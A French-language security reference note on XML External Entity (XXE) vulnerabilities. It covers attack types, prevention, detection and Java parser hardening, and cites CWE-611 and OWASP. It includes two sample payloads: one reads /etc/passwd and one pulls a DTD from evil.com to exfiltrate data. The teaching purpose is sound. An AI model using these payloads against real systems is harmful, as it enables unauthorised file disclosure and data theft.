### Description

Les failles d'XML External Entity (XXE) se produisent lorsqu'une application XML permet à un attaquant d'inclure des entités externes malveillantes ou des références à des ressources externes non sécurisées dans un document XML. Cela peut entraîner la divulgation de données sensibles, le déni de service, voire l'exécution de code à distance.

---
### Types d'Attaques XXE

 **XXE Basique :**

- Se produit lorsque l'application XML traite les entités externes sans validation ou protection adéquates.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

   - Cette attaque récupère le contenu du fichier `/etc/passwd`.

**XXE Out-Of-Band (OOB) :**

- Se produit lorsque l'attaquant utilise l'entité externe pour initier une connexion sortante vers un serveur contrôlé par lui.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
%xxe;
]>
<foo>&all;</foo>
```

   - Cette attaque peut être utilisée pour exfiltrer des données vers un serveur contrôlé par l'attaquant.

---
### Prévention des Attaques XXE

**Désactivation du Parsing des DTD :**

- Désactiver le parsing des DTD (Document Type Definitions) dans les bibliothèques XML.

**Validation des Entrées XML :**

- Valider et restreindre les entrées XML pour s'assurer qu'elles ne contiennent pas d'entités externes malveillantes.

**Utilisation de Méthodes Sécurisées :**

- Utiliser des méthodes sécurisées pour le traitement des documents XML, telles que DOM sécurisé ou SAX avec les entités externes désactivées.

---
### Détection des Failles XXE

**Analyse de la Configuration :**

- Examiner la configuration XML pour vérifier si le parsing des DTD est activé.

**Tests Manuels :**

- Effectuer des tests manuels en injectant des payloads XXE et en observant les réponses de l'application.

**Utilisation d'Outils de Sécurité :**

- Utiliser des outils de sécurité tels que Burp Suite, OWASP ZAP, ou des scanners spécifiques pour détecter les failles XXE.

---
### Exemples de Prévention

**Désactivation des DTD dans Java :**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**Utilisation de SAXParser avec les Entités Externes Désactivées :**

```java
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
SAXParser parser = factory.newSAXParser();
```

---

| Catégorie                    | Information                                                                                                                                                                                                                                                                                     |
| ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TTP**                      | Exploitation des références d'entités externes dans XML                                                                                                                                                                                                                                         |
| **CWE**                      | CWE-611 (Improper Restriction of XML External Entity Reference)                                                                                                                                                                                                                                 |
| **Description de l'attaque** | Une attaque XXE se produit lorsqu'un attaquant exploite des applications qui analysent XML de manière à injecter des références à des entités externes malveillantes. Cela peut mener à la divulgation d'informations confidentielles, au déni de service, ou à l'exécution de code à distance. |
| **Impacts potentiels**       | - Divulgation d'informations sensibles<br>- Déni de service<br>- Exécution de code à distance<br>- Porte dérobée dans les systèmes                                                                                                                                                              |
| **Comment la détecter**      | - Analyse de code statique et dynamique<br>- Utilisation de scanners de vulnérabilité<br>- Tests de pénétration ciblant les fonctionnalités de traitement XML                                                                                                                                   |
| **Remédiations/mitigations** | - Désactivation du traitement des entités externes dans les parseurs XML<br>- Validation et nettoyage des entrées XML<br>- Utilisation de listes blanches pour les éléments XML traités<br>- Mise à jour régulière des bibliothèques et frameworks XML                                          |
| **Lien de référence**        | [OWASP - XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)                                                                                                                                                            |
